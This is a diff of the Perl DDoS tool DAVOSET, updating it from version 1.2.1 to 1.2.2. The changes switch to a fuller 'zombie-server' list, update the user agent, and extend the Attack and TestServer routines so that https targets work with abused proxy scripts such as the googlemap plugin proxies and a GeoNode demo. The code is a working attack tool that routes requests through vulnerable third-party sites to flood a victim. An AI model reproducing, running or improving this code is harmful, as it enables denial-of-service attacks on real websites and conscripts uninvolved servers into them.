@@ -1,19 +1,19 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET 1.2.1
+# DAVOSET v.1.2.2
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2014
-# Last update: 23.10.2014
+# Last update: 31.10.2014
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.1"; # program version
-my $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"; # user agent
+my $version = "1.2.2"; # program version
+my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
-my $default_site = "http://site"; # default site for attack
+my $default_site = ""; # default site for attack
 my $testURL = "http://www.google.com"; # default site for testing botnet
-my $list_servers = "list.txt"; # list of zombie-servers
+my $list_servers = "list_full.txt"; # list of zombie-servers
 my $mode = "0"; # 0 - standard mode, 1 - cyclic mode
 my $cycles = "10"; # number of cycles in cyclic mode
 my $max_cycles = "1000"; # maximum number of cycles in cyclic mode
@@ -155,11 +155,11 @@ sub Attack { # send request to zombie-server
 	my $params = $_[3];
 	my ($sock,$host,$page,$port,$csrftoken,$cookie);
 
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_proxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap3_proxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
-	$site = "http://$site" if ($site !~ /^http:/ && $url =~ m|^http://demo.geonode.org|);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
+	$site = "http://$site" if ($site !~ /^https?:/ && $url =~ m|^http://demo.geonode.org|);
 	$url =~ m|(http://[^/]+)(/.+)?|;
 	$host = $1;
 	$page = $2;
@@ -280,11 +280,11 @@ sub TestServer { # test zombie-server
 	my $params = $_[3];
 	my ($sock,$host,$page,$content,$csrftoken,$cookie);
 
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_proxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap3_proxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
-	$site =~ s|^http://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
-	$site = "http://$site" if ($site !~ /^http:/ && $url =~ m|^http://demo.geonode.org|);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_proxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_proxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
+	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
+	$site = "http://$site" if ($site !~ /^https?:/ && $url =~ m|^http://demo.geonode.org|);
 	$url =~ m|(http://[^/]+)(/.+)?|;
 	$host = $1;
 	$page = $2;
